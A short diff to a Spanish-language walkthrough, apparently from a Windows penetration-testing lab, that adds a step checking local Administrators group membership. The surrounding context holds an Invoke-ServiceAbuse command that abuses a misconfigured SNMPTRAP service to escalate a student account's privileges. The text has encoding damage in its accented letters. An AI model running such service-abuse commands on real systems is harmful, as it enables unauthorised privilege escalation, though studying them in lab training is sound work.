@@ -167,3 +167,8 @@ Buscaremos cual es la funci√≥n que nosotros requerimos, en este caso queremos a√
 ```shell
 Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "scorp\student97" -verbose
 ```
+
+Verificaremos si pertenecemos al grupo de Adminitradores
+```shell
+Get-LocalGroupMember -Group "Administrators"
+```
